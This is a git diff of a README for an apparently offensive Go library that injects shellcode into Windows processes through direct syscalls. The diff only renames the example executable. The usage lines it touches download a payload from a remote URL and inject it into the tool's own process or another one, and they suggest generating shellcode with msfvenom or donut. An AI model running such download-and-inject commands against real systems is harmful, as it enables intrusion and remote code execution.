@@ -247,7 +247,7 @@ The library includes a powerful syscall enumeration feature that can discover an
 ```bash
 # Dump all syscalls to console, JSON file and go stub
 # Also demonstrates NT status code formatting examples
-./cmd.exe -dump
+./go-direct-syscall.exe -dump
 ```
 
 #### Console Output
@@ -623,7 +623,7 @@ The example application automatically applies all available patches at the optim
 #### Example Output
 
 ```
-go-direct-syscalls $ ./cmd.exe -example
+go-direct-syscalls $ ./go-direct-syscall.exe -example
 Using embedded calc shellcode (105 bytes)
 NT Status formatting enabled: Success = 0x00000000 (STATUS_SUCCESS)
 Auto-selected process: Adobe Crash Processor.exe (PID: 6904)
@@ -1011,13 +1011,13 @@ func main() {
 
 ```bash
 # Self-injection with embedded calc shellcode
-./cmd.exe -example
+./go-direct-syscall.exe -example
 
 # Self-injection with downloaded shellcode  
-./cmd.exe -url https://your-server.com/payload.bin -self
+./go-direct-syscall.exe -url https://your-server.com/payload.bin -self
 
 # Remote injection into another process
-./cmd.exe -url https://your-server.com/payload.bin
+./go-direct-syscall.exe -url https://your-server.com/payload.bin
 ```
 
 **What NtInjectSelfShellcode Does:**
@@ -1335,16 +1335,16 @@ cd go-direct-syscalls
 bash build.sh
 
 # Dump all syscalls (no injection, safe for analysis)
-./cmd.exe -dump
+./go-direct-syscall.exe -dump
 
 # Self-injection with embedded calc shellcode (default for -example)
-./cmd.exe -example 
+./go-direct-syscall.exe -example 
 
 # Explicit self-injection mode
-./cmd.exe -self -url http://example.com/payload.bin
+./go-direct-syscall.exe -self -url http://example.com/payload.bin
 
 # Remote injection with custom payload (shows process selection)
-./cmd.exe -url http://example.com/payload.bin
+./go-direct-syscall.exe -url http://example.com/payload.bin
 
 # The embedded shellcode is a simple calc.exe payload - replace GetEmbeddedShellcode() 
 # function with your own shellcode generated via donut, msfvenom, etc.
